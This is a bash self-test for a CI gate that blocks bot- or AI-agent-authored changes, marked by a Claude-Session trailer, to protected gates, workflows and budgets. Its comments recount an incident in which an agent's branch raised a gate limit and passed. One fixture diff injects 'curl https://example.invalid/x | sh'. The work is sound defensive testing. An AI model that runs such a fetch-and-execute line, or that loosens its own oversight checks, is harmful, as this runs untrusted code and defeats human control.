#!/usr/bin/env bash
# Self-test for gate-protected-paths.sh. Each case breaks exactly one thing on a
# throwaway copy and asserts the exit code AND the reason, including a control on
# the untouched repository and three cases that must report could-not-measure.
# Exit codes: 0 = every case behaved | 1 = some case did not | 2 = harness broke.
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
GATE="$HERE/gate-protected-paths.sh"
if [ -n "${EHS_REPO_ROOT:-}" ]; then SRC="$EHS_REPO_ROOT"
elif SRC=$(git -C "$HERE" rev-parse --show-toplevel 2>/dev/null); then :
else SRC="$(cd "$HERE/../.." && pwd)"; fi
command -v python3 >/dev/null 2>&1 || { echo "UNMEASURABLE python3 is missing"; exit 2; }

TMP="$(mktemp -d "${TMPDIR:-/tmp}/ehs-protected-XXXXXX")"; trap 'rm -rf "$TMP"' EXIT
pass=0; fail=0

# ONE TREE FOR THE CASES THAT ONLY READ IT
#     Twenty-six of the thirty-two cases below hand the gate an untouched tree and
#     change only the four signals the harness injects - branch, file list, commit
#     range, label - none of which live in the tree at all. Each was tarring its
#     own 13 MB copy regardless: 0.63 s per copy measured, 20 s of a 25 s battery,
#     and this is the slowest battery in the suite under `--jobs 8` for exactly
#     that reason - thirty-two copies competing for one disk. They now share one.
#
#     The six that DO mutate the tree still get a private copy, and which is which
#     is not a list anybody maintains: it is whether the case passed a mutation,
#     and the mutation is run by this harness. A case cannot dirty a tree it never
#     asked to change.
#
#     Sharing is the kind of change that goes green for the wrong reason, so it is
#     checked rather than argued. Three cases at the ends of this file do it: the
#     shared tree is the same tree a case used to get, no case wrote into it, and
#     - because a check that cannot see a change is not a check - the fingerprint
#     moves when one byte is appended.
# Chosen once and named, not assumed: sha256sum is the one a Linux runner has and
# shasum is the one this laptop has, and a battery that hard-coded either would be
# green on one machine and could-not-measure on the other.
if command -v sha256sum >/dev/null 2>&1; then HASH=sha256sum
elif command -v shasum >/dev/null 2>&1; then HASH=shasum
else
  echo "UNMEASURABLE neither sha256sum nor shasum is here, so the shared tree cannot be fingerprinted"
  exit 2
fi

tree_digest() {
  local d="$1" h
  h="$( (cd "$d" && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 "$HASH") 2>/dev/null \
        | "$HASH" | cut -d' ' -f1 )"
  # An empty reading is not "the tree is empty", it is "I could not look", and the
  # two must never arrive at the caller wearing the same face.
  case "$h" in ''|*[!0-9a-f]*) return 1 ;; esac
  printf '%s\n' "$h"
}

SHARED="$TMP/.shared"; mkdir -p "$SHARED"
(cd "$SRC" && tar --exclude .git --exclude __pycache__ --exclude node_modules -cf - .) | (cd "$SHARED" && tar -xf -)
if ! SHARED_BEFORE="$(tree_digest "$SHARED")"; then
  echo "UNMEASURABLE the shared work tree cannot be fingerprinted, so nothing below is trustworthy"
  exit 2
fi
shared_used=0; private_used=0

# The commit range and the label are the two signals a branch does not choose,
# so they are the two the harness has to be able to INJECT. The work tree is a
# tar copy with no `.git`, which means git cannot supply them here and every
# case states its own - which is the point: a battery that reads the same signal
# the gate reads from the same place is testing nothing.
#
# case <name> <branch> <files> <expected rc> <needle> <mutation> [<commits>] [<label>]
case_run() {
  local name="$1" branch="$2" files="$3" want="$4" needle="$5" mutation="$6"
  local commits="${7-}" label="${8--}"
  # The four injected signals go in a scratch directory of their own and never in
  # the tree. They are what this harness SUPPLIES; a case that wrote them into a
  # shared tree would be handing the next case its inputs.
  local scratch="$TMP/s-$name" work
  rm -rf "$scratch"; mkdir -p "$scratch"
  if [ -n "$mutation" ]; then
    # --exclude node_modules is not tidiness: tooling/claude-cli/node_modules
    # is 259 MB of the repository's 321 MB, this gate reads none of it, and
    # every case below was tarring its own copy. Measured before:
    # 7855 MiB of peak disk and 2013 "No space left on device" write errors,
    # with four cases turning red for a reason that has nothing to do with
    # protected paths.
    work="$TMP/$name"; rm -rf "$work"; mkdir -p "$work"
    (cd "$SRC" && tar --exclude .git --exclude __pycache__ --exclude node_modules -cf - .) | (cd "$work" && tar -xf -)
    if ! EHS_WORK="$work" python3 -c "$mutation" >/dev/null 2>&1; then
      printf 'HARNESS  %-40s the mutation itself failed\n' "$name"; fail=$((fail+1))
      rm -rf "$work" "$scratch"; return
    fi
    private_used=$((private_used+1))
  else
    work="$SHARED"
    shared_used=$((shared_used+1))
  fi
  local list="$scratch/.changed"
  printf '%s\n' "$files" > "$list"
  local out rc args
  args=(--changed-files "$list" --override "$label")
  # `NONE` means "do not pass one at all"; the default `-` means "read and empty",
  # and the gate has to tell those two apart or a blind run reads as a clean one.
  if [ "$commits" = "NONE" ]; then args+=(--authorship -)
  else
    printf '%s\n' "$commits" > "$scratch/.commits"
    args+=(--authorship "$scratch/.commits")
  fi
  # CASE_DIFF: the unified diff this case wants the gate to read. The work tree is
  # a tar copy with no `.git`, so the gate can never produce one here on its own -
  # and that is deliberate: with no diff no content exemption applies, so every
  # case written before exemptions existed keeps its old verdict unchanged. A case
  # that wants an exemption evaluated has to hand the diff over, in writing.
  if [ -n "${CASE_DIFF:-}" ]; then
    printf '%s\n' "$CASE_DIFF" > "$scratch/.diff"
    args+=(--diff "$scratch/.diff")
  fi
  [ "$branch" = "NONE" ] || args+=(--branch "$branch")
  [ "$files" = "NOLIST" ] && args=(--branch "$branch" --changed-files "$scratch/.missing")
  # Hermetic on purpose. On a CI runner GITHUB_HEAD_REF and GITHUB_BASE_REF are
  # set, and the gate reads them as defaults - so a case meant to prove "I cannot
  # tell whose branch this is" silently got told, passed locally and failed on the
  # runner. A battery that inherits the environment is not proving what it claims.
  out="$(env -u GITHUB_HEAD_REF -u GITHUB_BASE_REF -u BASE_REF -u CHANGED_FILES_FILE \
        EHS_REPO_ROOT="$work" bash "$GATE" "${args[@]}" 2>&1)"; rc=$?
  if [ "$rc" -eq "$want" ] && { [ -z "$needle" ] || grep -q -- "$needle" <<<"$out"; }; then
    printf 'ok       %-40s rc=%s\n' "$name" "$rc"; pass=$((pass+1))
  else
    printf 'FAILED   %-40s rc=%s (wanted %s)\n' "$name" "$rc" "$want"
    printf '%s\n' "$out" | sed 's/^/         /' | tail -5; fail=$((fail+1))
  fi
  # And the private copy goes with the case. It is a NEW directory per case, so
  # the `rm -rf` at the top only ever removed a directory that did not exist yet:
  # every copy piled up until the EXIT trap fired. One at a time is the whole
  # requirement. The shared tree is not the case's to delete.
  [ "$work" = "$SHARED" ] || rm -rf "$work"
  rm -rf "$scratch"
}

echo "=== self-test: gate-protected-paths.sh (source: $SRC) ==="

# THE SHARED TREE IS THE SAME TREE A CASE USED TO GET. Not an argument about tar
# being deterministic: one private copy is made exactly the way every case made
# its own before this change, and the two are required to fingerprint alike. A
# shared tree that had come out short would let twenty-six cases pass against
# something the gate never sees in CI, and every one of them would look green.
EQUIV="$TMP/.equiv"; mkdir -p "$EQUIV"
(cd "$SRC" && tar --exclude .git --exclude __pycache__ --exclude node_modules -cf - .) | (cd "$EQUIV" && tar -xf -)
if EQUIV_D="$(tree_digest "$EQUIV")"; then
  if [ "$EQUIV_D" = "$SHARED_BEFORE" ]; then
    printf 'ok       %-40s\n' shared-tree-equals-a-private-one; pass=$((pass+1))
  else
    printf 'FAILED   %-40s the shared tree is not what a case used to be given\n' \
           shared-tree-equals-a-private-one; fail=$((fail+1))
  fi
else
  echo "UNMEASURABLE a private copy cannot be fingerprinted, so the shared one cannot be compared to it"
  exit 2
fi
rm -rf "$EQUIV"

case_run automation-touches-nothing-protected bot/knowledge-loop \
  'skills/ethical-hacker-squad/references/knowledge/web-api.md' 0 "no protected path" ""

case_run automation-edits-a-gate bot/knowledge-loop \
  'scripts/gates/gate-secret-scan.sh' 1 "an automation that can edit its own limits has none" ""

case_run automation-edits-the-manifest bot/refresh \
  '.claude-plugin/plugin.json' 1 "protected by \`.claude-plugin/\*\*\`" ""

case_run automation-edits-the-allowlist bot/refresh \
  'docs/sources-allowlist.json' 1 "docs/sources-allowlist.json" ""

case_run unattributed-may-touch-them-and-is-listed feat/whatever \
  'scripts/gates/gate-secret-scan.sh' 0 "UNATTRIBUTED" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

# --------------------------------------------------------------------------
# The hole this gate had until 2026-09-01, and the three cases that close it.
# PR #72 raised MAX_TREE_BYTES inside scripts/gates/** on a branch the agent had
# named `loop/...`, and the gate passed it green. Case one is that exact diff.
# --------------------------------------------------------------------------
case_run agent-trailer-on-a-branch-named-anything loop/inference-endpoint \
  'scripts/gates/gate-plugin-integrity.sh' 1 "carries a \`Claude-Session:\` trailer" "" \
  'cafe123\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\tClaude-Session: https://claude.ai/code/session_x'

case_run bot-identity-on-a-branch-named-anything feature/deps-bump \
  '.github/workflows/ci.yml' 1 "names \`\[bot\]\` as an author or committer" "" \
  'f00d456\tdependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>\tGitHub <noreply@github.com>\t'

# The mark can only incriminate. A branch called `bot/` still fails with a
# perfectly human commit range, because an admission is evidence and a denial
# is not - and if this case ever goes green the asymmetry has been lost.
case_run admission-still-counts-with-a-clean-range bot/knowledge-loop \
  'scripts/gates/gate-secret-scan.sh' 1 "reserves for automation" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

# --------------------------------------------------------------------------
# Blindness is not innocence. With the range unreadable AND a protected path in
# the diff, half the classifier did not run: 2, never 0.
# --------------------------------------------------------------------------
case_run range-unreadable-and-a-limit-moved feat/whatever \
  'scripts/gates/gate-secret-scan.sh' 2 "cannot say by what" "" 'NONE'

# ...and it is only blindness where it matters. A diff that moves no limit does
# not need the range at all, and a gate that went amber on every such run would
# be a gate people learn to skip.
case_run range-unreadable-but-no-limit-moved feat/whatever \
  'README.md' 0 "no protected path" "" 'NONE'

# --------------------------------------------------------------------------
# The way out, in both directions. It has to work, and it has to be impossible
# to mistake for a pass.
# --------------------------------------------------------------------------
case_run override-label-lets-a-marked-change-through loop/x \
  'scripts/gates/gate-secret-scan.sh' 0 "MOVED BY AN AUTOMATION, WITH CONSENT" "" \
  'cafe123\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\tClaude-Session: https://claude.ai/code/session_x' 'override/g7-reviewed'

case_run override-label-does-not-silence-drift loop/x \
  'README.md' 1 "the documented G7 list and" \
  '
import os,re,pathlib
p=pathlib.Path(os.environ["EHS_WORK"])/"docs/gate-requirements.md"
p.write_text(p.read_text().replace("NOTICE.md\n```","```",1))' \
  'cafe123\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\tClaude-Session: https://claude.ai/code/session_x' 'override/g7-reviewed'

case_run override-standing-on-nothing-is-called-out feat/whatever \
  'scripts/gates/gate-secret-scan.sh' 0 "nothing needed it" "" \
  'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t' 'override/g7-reviewed'

case_run documented-list-drifts-from-the-enforced-one bot/x \
  'README.md' 1 "the documented G7 list and" '
import os,re,pathlib
p=pathlib.Path(os.environ["EHS_WORK"])/"docs/gate-requirements.md"
p.write_text(p.read_text().replace("NOTICE.md\n```","```",1))'

case_run enforced-list-grows-without-the-doc bot/x \
  'README.md' 1 "the documented G7 list and" '
import os,json,pathlib
p=pathlib.Path(os.environ["EHS_WORK"])/"scripts/gates/data/protected-paths.json"
d=json.loads(p.read_text()); d["paths"].append("SECURITY.md"); p.write_text(json.dumps(d,indent=2))'

# --------------------------------------------------------------------------
# THE FOLD, and the line it must never cross.
#
# Measured across the 28 merged changes that tripped G7: 38 of the 150 paths it
# named were fixture INPUTS, and on the worst change 2 genuine limits sat under
# 19 lines of them. A list where the two lines that matter are buried under
# nineteen that do not is a list nobody reads to the end, so the UNATTRIBUTED
# listing folds that material into one counted line.
#
# That is a DISPLAY decision and these cases are what keeps it one. Folding may
# never reach a FINDING and never reach an OVERRIDE listing: when G7 actually
# fails, or when a maintainer waves a marked change through, every path is named
# in full. Removing a control and burying it in a summary are the same edit, and
# cases three and four are the ones that would catch this fold becoming the
# second thing.
# --------------------------------------------------------------------------
case_run fold-names-the-real-limit-in-full feat/whatever \
  $'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml\nscripts/gates/fixtures/safepath/bad/2-cd-inside-run.yml\nscripts/gates/fixtures/hardening/unmeasurable/01-with-tabs.yml\nscripts/gates/gate-secret-scan.sh' \
  0 "- scripts/gates/gate-secret-scan.sh (matches" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

case_run fold-counts-what-it-folded feat/whatever \
  $'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml\nscripts/gates/fixtures/safepath/bad/2-cd-inside-run.yml\nscripts/gates/fixtures/hardening/unmeasurable/01-with-tabs.yml\nscripts/gates/gate-secret-scan.sh' \
  0 "3 negative-proof inputs, folded" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

# The one that matters. A marked change touching ONLY folded material still
# fails, and the failure names the file - a finding is not a summary.
case_run a-finding-names-every-folded-path-in-full bot/knowledge-loop \
  'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml' 1 "06-uses-without-sha.yml (protected by" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

case_run an-override-names-every-folded-path-in-full loop/x \
  'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml' 0 "06-uses-without-sha.yml (matches" "" 'cafe123\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\tClaude-Session: https://claude.ai/code/session_x' 'override/g7-reviewed'

# The fold cannot be allowed to read as "nothing moved". When there is nothing
# left to protect from the noise, it says so instead of counting against zero.
case_run only-negative-proof-moved-and-it-says-so feat/whatever \
  $'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml\nscripts/gates/fixtures/safepath/bad/2-cd-inside-run.yml' 0 "and NOTHING ELSE" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

# The input is the proof; the .expected is what says the proof proved anything.
# Nothing watches an assertion being weakened, so it never folds.
case_run an-expected-assertion-is-never-folded feat/whatever \
  $'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml\nscripts/gates/fixtures/findings/bad/26-reported-inside-a-surface-declared-not-read.expected' 0 "not-read.expected (matches" "" 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

# Absent-safe, and a mutant guard in one: with the declaration gone nothing
# folds and every path is named. If this case ever goes green with the fold
# still declared, the fold is matching nothing.
case_run no-fold-declared-lists-every-path feat/whatever \
  'scripts/gates/fixtures/hardening/bad/06-uses-without-sha.yml' 0 "06-uses-without-sha.yml (matches" '
import os,json,pathlib
p=pathlib.Path(os.environ["EHS_WORK"])/"scripts/gates/data/protected-paths.json"
d=json.loads(p.read_text()); d.pop("listing_fold",None); p.write_text(json.dumps(d,indent=2))' 'deadbee\tAna Ruiz <ana@example.org>\tAna Ruiz <ana@example.org>\t'

case_run branch-unknown NONE \
  'README.md' 2 "" '
import os,pathlib,shutil
# make the work tree not a repository, so the gate cannot fall back to git
shutil.rmtree(pathlib.Path(os.environ["EHS_WORK"])/".git", ignore_errors=True)'

case_run changed-file-list-missing bot/x NOLIST 2 "" ""

case_run data-file-unusable bot/x 'README.md' 2 "" '
import os,pathlib
(pathlib.Path(os.environ["EHS_WORK"])/"scripts/gates/data/protected-paths.json").write_text("{")'

# --------------------------------------------------------------------------
# The hole this gate had on 2026-09-01, from the other side: it failed on EVERY
# Dependabot pull request in the github_actions ecosystem, and could never have
# passed one. `.github/workflows/**` became protected on 23c240f; PR #73 taught
# the gate to recognise `[bot]`. Both right; their intersection unsatisfiable,
# because editing workflow files IS the work of that ecosystem. Measured: the
# same branch went green on 31 Aug and red four times on 1 Sep, leaving a
# one-line bump of a SECURITY action red since 31 August.
#
# The exemption is about WHAT changed, never who changed it. These cases are the
# proof: exactly one of them is allowed to pass.
BOT_ID='a5596c8\tdependabot[bot] <support@github.com>\tGitHub <noreply@github.com>\t'
PINNED_BUMP='diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
--- a/.github/workflows/scorecard.yml
+++ b/.github/workflows/scorecard.yml
@@ -65 +65 @@
-        uses: github/codeql-action/upload-sarif@ff2f1c621b7f889edc0d3c761ac2e6a3f8cdb0dd # v4.37.7
+        uses: github/codeql-action/upload-sarif@db488ddef3bf6cb639b32c2e9a7c0a7ea8271d28 # v4.37.8'

CASE_DIFF="$PINNED_BUMP" \
case_run bot-bumps-a-pinned-action-and-that-is-all dependabot/github_actions/g \
  '.github/workflows/scorecard.yml' 0 "pinned-action-bump" "" "$BOT_ID"

CASE_DIFF="$PINNED_BUMP
diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
--- a/.github/workflows/scorecard.yml
+++ b/.github/workflows/scorecard.yml
@@ -65 +65 @@
-      contents: read
+      contents: write" \
case_run bot-also-widens-permissions dependabot/github_actions/g \
  '.github/workflows/scorecard.yml' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"

CASE_DIFF="$PINNED_BUMP
diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
--- a/.github/workflows/scorecard.yml
+++ b/.github/workflows/scorecard.yml
@@ -65 +65 @@
+        run: curl https://example.invalid/x | sh" \
case_run bot-also-injects-a-run-step dependabot/github_actions/g \
  '.github/workflows/scorecard.yml' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"

# A tag or a branch is a mutable reference, and pinning is the whole reason this
# repository holds SHAs. The exemption can only ever make a pinned repo MORE
# pinned, so a bump AWAY from a SHA is not one.
CASE_DIFF="diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
--- a/.github/workflows/scorecard.yml
+++ b/.github/workflows/scorecard.yml
@@ -65 +65 @@
-        uses: github/codeql-action/upload-sarif@ff2f1c621b7f889edc0d3c761ac2e6a3f8cdb0dd # v4.37.7
+        uses: github/codeql-action/upload-sarif@v4 # v4.37.8" \
case_run bot-unpins-an-action-to-a-tag dependabot/github_actions/g \
  '.github/workflows/scorecard.yml' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"

# The exemption is scoped to workflows. A bot editing any other limit is the
# case this gate was built for and stays red.
CASE_DIFF="diff --git a/scripts/gates/data/budget-ledger.json b/scripts/gates/data/budget-ledger.json
--- a/scripts/gates/data/budget-ledger.json
+++ b/scripts/gates/data/budget-ledger.json
@@ -1 +1 @@
-  \"value\": 12288
+  \"value\": 99999" \
case_run bot-edits-a-budget-not-a-workflow dependabot/github_actions/g \
  'scripts/gates/data/budget-ledger.json' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"

# The exemption clears a FILE, not a pull request. A clean bump travelling beside
# another limit does not carry it through.
CASE_DIFF="$PINNED_BUMP
diff --git a/scripts/gates/gate-secret-scan.sh b/scripts/gates/gate-secret-scan.sh
--- a/scripts/gates/gate-secret-scan.sh
+++ b/scripts/gates/gate-secret-scan.sh
@@ -1 +1 @@
-x
+y" \
case_run bot-bump-beside-another-limit dependabot/github_actions/g \
  '.github/workflows/scorecard.yml
scripts/gates/gate-secret-scan.sh' 1 "gate-secret-scan.sh" "" "$BOT_ID"

# Fails CLOSED. The same clean bump with NO diff supplied stays red, because the
# question was never asked. A rule that turns into a pass when its input goes
# missing is the false green this repository has already been burned by.
case_run bot-bump-with-no-diff-stays-protected dependabot/github_actions/g \
  '.github/workflows/scorecard.yml' 1 "no diff was supplied" "" "$BOT_ID"


# --------------------------------------------------------------------------
# The two cases that make the shared tree safe rather than merely fast.
# --------------------------------------------------------------------------
if ! SHARED_AFTER="$(tree_digest "$SHARED")"; then
  echo "UNMEASURABLE the shared tree cannot be fingerprinted after the run, so whether a case wrote into it is not decidable"
  exit 2
fi
if [ "$SHARED_AFTER" = "$SHARED_BEFORE" ]; then
  printf 'ok       %-40s %s shared, %s private\n' \
         shared-tree-unchanged-by-every-case "$shared_used" "$private_used"
  pass=$((pass+1))
else
  printf 'FAILED   %-40s a case wrote into the tree the other cases read\n' \
         shared-tree-unchanged-by-every-case; fail=$((fail+1))
fi

# A check that cannot see a change is not a check. This one dirties the shared
# tree on purpose, after every case has finished with it.
if ! printf 'x' >> "$SHARED/README.md"; then
  echo "UNMEASURABLE the shared tree cannot be written to, so the fingerprint cannot be shown to work"
  exit 2
fi
if ! SHARED_DIRTY="$(tree_digest "$SHARED")"; then
  echo "UNMEASURABLE the dirtied tree cannot be fingerprinted"
  exit 2
fi
if [ "$SHARED_DIRTY" != "$SHARED_BEFORE" ]; then
  printf 'ok       %-40s\n' the-fingerprint-sees-one-byte; pass=$((pass+1))
else
  printf 'FAILED   %-40s one byte appended and the fingerprint did not move\n' \
         the-fingerprint-sees-one-byte; fail=$((fail+1))
fi

echo
echo "Summary: $pass passed, $fail failed"
if [ "$fail" -eq 0 ]; then
  echo "Result: OK. A change carrying ANY mark of automation - a reserved branch prefix, an"
  echo "        agent trailer, a bot identity - cannot move the limits whatever the branch is"
  echo "        called; an unattributed one can and is listed, and is never called human. A"
  echo "        maintainer label lets a marked change through loudly and does not silence"
  echo "        drift. A missing branch, file list or commit range is could-not-measure."
  exit 0
fi
exit 1
